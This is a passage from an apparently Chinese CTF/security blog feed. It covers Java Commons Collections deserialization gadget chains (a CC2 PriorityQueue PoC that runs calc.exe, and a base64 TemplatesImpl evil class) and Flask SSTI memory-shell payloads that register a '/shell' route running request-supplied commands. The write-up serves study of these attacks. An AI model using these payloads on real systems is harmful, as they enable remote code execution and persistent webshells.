class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getRCE</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/* * * * * * 1. 实现一: 返回字符串 * * * * * */</span></span><br><span class="line">        <span class="comment">// S1: maven compile</span></span><br><span class="line">        <span class="comment">// S2: wsl: cat ./xxx/xx.class | base64 &gt; /tmp/kc1zs4.txt</span></span><br><span class="line">        <span class="comment">// S3: 利用wsl: tr -d &#x27;\n&#x27; &lt; /tmp/kc1zs4.txt</span></span><br><span class="line">        <span class="comment">// return &quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNMVGVtcGxhdGVzSW1wbEV2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwArBwApAQAKU291cmNlRmlsZQEAFlRlbXBsYXRlc0ltcGxFdmlsLmphdmEMABsAHAcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMwAcAQARVGVtcGxhdGVzSW1wbEV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAADAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEAARAAEAAAABABIAEwACABQAAAAEAAEAFQABAAkAFgACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAEQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEAARAAEAAAABABcAGAACAAAAAQAZABoAAwAUAAAABAABABUAAQAbABwAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAAFAAEABcADQAaABAAGAARABkAFQAbAA0AAAAWAAIAEQAEAB0AHgABAAAAFgAOAA8AAAAfAAAAEAAC/wAQAAEHACAAAQcAIQQAAQAiAAAAAgAj&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 2. 实现二：通过文件读取 * * * * * */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(</span><br><span class="line">                    readAllBytes(Paths.get(<span class="string">&quot;D:\\Desktop\\CODE\\IDEA\\JavaSec\\JavaSec_CC_review\\target\\classes\\TemplatesImplEvil.class&quot;</span>))</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="CC2-For4-PQandTransMap"><a href="#CC2-For4-PQandTransMap" class="headerlink" title="CC2_For4_PQandTransMap"></a>CC2_For4_PQandTransMap</h2><ul><li>env<ul><li><p>JDK</p><ul><li>⽼的利⽤链在commons-collections4中只需要少量修改就可以使用(CC1,CC3,CC6)，<strong>但是内部逻辑其实有了较多的不同了，遵循着Transformers的思想找就好了</strong>: TransformedMap和LazyMap</li></ul></li><li><p>maven: commons-collections4 4.0以后4.1之前[<a href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4]">https://mvnrepository.com/artifact/org.apache.commons/commons-collections4]</a></p><ul><li>cc的新版本包，api发生了变化，但是命名不重复，可以共存在一个项目中</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ol><li><p>利用到的点: Transformers(用到了TransformedMap系列的思想), PriorityQueue(java.util), TransformingComparator</p></li><li><p>CC2_For4_PriorityQueue的核心要点</p><ol><li><p><strong>入口点</strong>: PriorityQueue中的readObject()底层调用了comparaotr</p></li><li><p><strong>触发点</strong>: PriorityQueue在readObject中使用了siftdown思路，进行比较触发了Transformers系列TransformingComparator的transform方法</p><ol><li>在加载时需要使得PriorityQueue中至少有两个元素并且要进行比较</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// k从(size &gt;&gt;&gt; 1) - 1 --&gt; size/2-1开始，本质是一个数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>调用目标方法</strong>: InvokerTransformer</p></li><li><p><strong>获取Runtime对象</strong>: ConstantTransformer</p></li><li><p><strong>链式调用</strong>: ChainedTransformer组成的TransformerChain，这里的transform()是比较特殊的，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，而不是一直在一个对象上调用</p></li></ol></li><li><p>Gadget Chain: 调用栈顺序</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain</span></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">    org.apache.commons.collections.functors.ConstantTransformer.transform()</span><br><span class="line">        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">            org.apache.commons.collections4.comparators.TransformingComparator.compare()</span><br><span class="line">                &#123;     </span><br><span class="line">                    java.util.PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    java.util.PriorityQueue.siftDown()</span><br><span class="line">                &#125; java.util.PriorityQueue.readObject()</span><br></pre></td></tr></table></figure></li><li><p>poc</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc from p牛</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)  <span class="comment">// 加上常量可以进行比较，否则会报错出来</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 这里多了一步Comparator的构造</span></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 2. 构造triggerObj * * * * * */</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 不是最大堆，明显会发生一次比较和交换，这里直接按照逻辑不用一步一步分析代码了(严谨总是好的)</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 3. 正式插入payload * * * * * */</span></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol><li>不同链子中的思维妙点<ol><li>CC1_TransformedMap: 链式构造payload、一直反向推理到readObject做起点</li><li>CC1_LazyMap: 利用动态代理连接链子(这里外面的AnnotationInvocationHandler也可以是任何会在readObject处调用到动态代理的类)</li><li>CC6_LazyMap: 逐级向上查找、get()到Entry的推理、Map自定义键值</li><li>CC3_TemplatesImpl: TemplatesImpl和TrAXFilter都是jdk自带的类(一个sink点，但是LazyMap和ChainedTransformer还是CC链的东西，重点在于Transformer)</li></ol></li><li>总结出一份图例出来<ol><li>CC1, CC6: InvokeTransformer(执行恶意代码)</li><li>CC3: TemplatesImpl + InstantiateTransformer(加载恶意类)</li></ol></li><li>大致链子可以分为(按照段的算法)<ul><li>执行命令方式: TransformedMap, TemplatesImpl</li><li>构造链子部分: AnnotationInvocationHandler, PriorityQueue(only CC4), LazyMap+AnnotationInvocationHandler, LazyMap+TiedMapEntry</li></ul></li></ol><h2 id="CC链之死"><a href="#CC链之死" class="headerlink" title="CC链之死"></a>CC链之死</h2><blockquote><p>CC链的利用只能在于3.2.2之前和4.1之前</p></blockquote><ol><li><p>Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2</p></li><li><p>p牛原文</p><blockquote><p>先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization&#x3D;true ，即默认情况下会 抛出异常。 这个检查在常⻅的危险Transformer类 （ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransforme r 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常<br>再看4.1，修复⽅式⼜不⼀样。4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就 是说，他们⼏个彻底⽆法序列化和反序列化了。更绝</p></blockquote></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://www.anquanke.com/post/id/261724">大全了</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python内存马</title>
      <link href="/2025/01/31/Python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/01/31/Python%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="python命名空间"><a href="#python命名空间" class="headerlink" title="python命名空间"></a>python命名空间</h2><ol><li>作用域不是L-&gt;E-&gt;G-&gt;B吗，为什么还要global和nonlocal？</li></ol><h2 id="python关键模块"><a href="#python关键模块" class="headerlink" title="python关键模块"></a>python关键模块</h2><ol><li>在原型链污染也有用，也有相应的资料</li></ol><h2 id="内存马与使用条件"><a href="#内存马与使用条件" class="headerlink" title="内存马与使用条件"></a>内存马与使用条件</h2><ol><li>前置条件<ol><li>ssti</li><li>pickle</li></ol></li><li>解决问题: <strong>无回显不出网</strong></li><li>主要思想: 动态注册webshell路由</li></ol><h2 id="flask-poc"><a href="#flask-poc" class="headerlink" title="flask poc"></a>flask poc</h2><ol><li><p>环境展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   ```</span><br><span class="line"></span><br><span class="line"><span class="comment">### 报错回显</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 前置</span><br><span class="line">   <span class="number">1.</span> debug模式下</span><br><span class="line"><span class="number">2.</span> 利用原理与思想</span><br><span class="line">   <span class="number">1.</span> 在debug模式下，报错会带出详细信息，通过手动报错<span class="keyword">raise</span> Exception()的方式来让我们的命令回显</span><br><span class="line">   <span class="number">2.</span> **思想学习一下报错回显的思考角度**</span><br><span class="line"><span class="number">3.</span> payload展示</span><br><span class="line">   <span class="number">1.</span> 在没有直接回显&#123;&#123;&#125;&#125;的情况下，debug模式也会展示错误内容</span><br><span class="line">   <span class="number">2.</span> ![报错回显](/pic/Python内存马/error_show.png)</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    <span class="comment"># 可控的rasie Exception都可以</span></span><br><span class="line">    &#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="add-url"><a href="#add-url" class="headerlink" title="add_url"></a>add_url</h3><h4 id="低版本flask"><a href="#低版本flask" class="headerlink" title="低版本flask"></a>低版本flask</h4><ol><li><p>ref</p><ol><li><a href="https://xz.aliyun.com/news/10381">有用到_reqeust_ctx_stack</a></li></ol></li><li><p>前置</p><ol><li><p>低版本flask，高版本会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssertionError: The setup method <span class="string">&#x27;add_url_rule&#x27;</span> can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</span><br><span class="line">Make sure all imports, decorators, <span class="built_in">functions</span>, etc. needed to <span class="built_in">set</span> up the application are <span class="keyword">done</span> before running it.</span><br></pre></td></tr></table></figure></li><li><p>经过调试后发现，调用add_url_rule时会先调用_check_setup_finished来check是否已经启动配置过，这里由于在访问endpoint时已经进行了一次访问，_got_first_request已经从False被设置为True了，无法再进行add_url_rule</p></li></ol></li><li><p>利用原理</p><ol><li>分析路径: 使用@app.route()时，会调用add_url_rule函数，允许我们传入一个函数来处理请求(可以时lambda)，给到了攻击的可能性</li></ol>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.route()</span><br><span class="line">add_url_rule()</span><br></pre></td></tr></table></figure></li><li><p>poc</p><ol><li>绕过技巧<ol><li>url_for可替换为get_flashed_messages或者request.__init__或者request.application，只要能访问到eval就可以了</li><li>其他就是常见的ssti绕过就ok了</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### payload1</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">### payload1 展开分析</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">      <span class="string">&quot;&quot;&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">      )&quot;&quot;&quot;</span>,</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">      <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2. _request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;) 从当前请求的查询参数中获取 cmd 参数的值，_request_ctx_stack.top指向当前请求的上下文，包含request和session等重要信息</span></span><br><span class="line"><span class="string">3. current_app 是 Flask 的一个代理对象，指向当前正在处理的 Flask 应用</span></span><br><span class="line"><span class="string">4. 这些变量通过 url_for.__globals__ 访问，并传递给 eval 的第二个参数（即 eval 的局部命名空间），使得可以再 eval 中访问这些内容 --&gt; payload2更加简洁</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### payload2</span></span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;sys&quot;).modules[&quot;__main__&quot;].__dict__[&quot;app&quot;].add_url_rule(&quot;/shell&quot;, &quot;shell&quot;, lambda: __import__(&quot;os&quot;).popen(&quot;dir&quot;).read())&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">### payload2 展开分析</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span 